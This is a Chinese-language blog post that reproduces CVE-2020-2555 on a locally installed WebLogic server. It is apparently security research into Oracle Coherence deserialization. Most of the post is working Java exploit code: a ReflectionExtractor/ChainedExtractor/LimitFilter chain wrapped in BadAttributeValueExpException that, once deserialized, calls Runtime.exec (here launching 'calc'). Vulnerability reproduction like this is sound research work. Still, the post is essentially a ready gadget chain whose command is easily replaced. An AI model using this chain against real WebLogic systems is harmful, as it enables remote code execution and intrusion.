# CVE-2020-2555

用windows本机搭建了weblogic就10min的事情....

试试看看自己能不能复现出来吧~

首先知道了漏洞触发点LimitFilter#toString
在ValueExtractor实现类中找到了如下能够执行命令的地方
![image-20230120170405267](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202301201704468.png)

ReflectionExtractor#extract能够执行命令。

```java
        Runtime runtime = Runtime.getRuntime();
        ReflectionExtractor<Object, Object> objectObjectReflectionExtractor = new ReflectionExtractor<>("exec",new Object[]{new String[]{"calc"}});
        objectObjectReflectionExtractor.extract(runtime);
```

```java
        Runtime runtime = Runtime.getRuntime();
        ReflectionExtractor<Object, Object> objectObjectReflectionExtractor = new ReflectionExtractor<>("exec",new Object[]{new String[]{"calc"}});

        LimitFilter<Object> objectLimitFilter = new LimitFilter<>();
        objectLimitFilter.setComparator(objectObjectReflectionExtractor);
        objectLimitFilter.setTopAnchor(runtime);
        
        objectLimitFilter.toString();
```

没办法反序列化runtime,类似CC，寻找一个能串联起Runtime的方法（换言之就是用ReflectionExtractor获取Runtime的对象并将其串联起来）。
ChainedExtractor#extract

```java
package weblogic.test;

import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import com.tangosol.util.filter.LimitFilter;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;

public class Demo {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
//        Runtime runtime = Runtime.getRuntime();
//        ReflectionExtractor<Object, Object> objectObjectReflectionExtractor = new ReflectionExtractor<>("exec",new Object[]{new String[]{"calc"}});
//
//        LimitFilter<Object> objectLimitFilter = new LimitFilter<>();
//        objectLimitFilter.setComparator(objectObjectReflectionExtractor);
//        objectLimitFilter.setTopAnchor(runtime);
//
//        objectLimitFilter.toString();


        ReflectionExtractor<Object, Object> getRuntime = new ReflectionExtractor<>("getMethod", new Object[]{"getRuntime",null});
        ReflectionExtractor<Object, Object> invoke = new ReflectionExtractor<>("invoke", new Object[]{null, null});
        ReflectionExtractor<Object, Object> exec = new ReflectionExtractor<>("exec", new Object[]{new String[]{"calc"}});


        ReflectionExtractor[] extractors = {
                getRuntime,
                invoke,
                    exec,
        };

        ChainedExtractor<Object, Object> objectObjectChainedExtractor = new ChainedExtractor<>(extractors);
        LimitFilter<Object> objectLimitFilter = new LimitFilter<>();
        objectLimitFilter.setComparator(objectObjectChainedExtractor);
        objectLimitFilter.setTopAnchor(Runtime.class);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field val = badAttributeValueExpException.getClass().getDeclaredField("val");
        val.setAccessible(true);
        val.set(badAttributeValueExpException,objectLimitFilter);


        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();


    }
}

```

![image-20230120185459250](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202301201854402.png)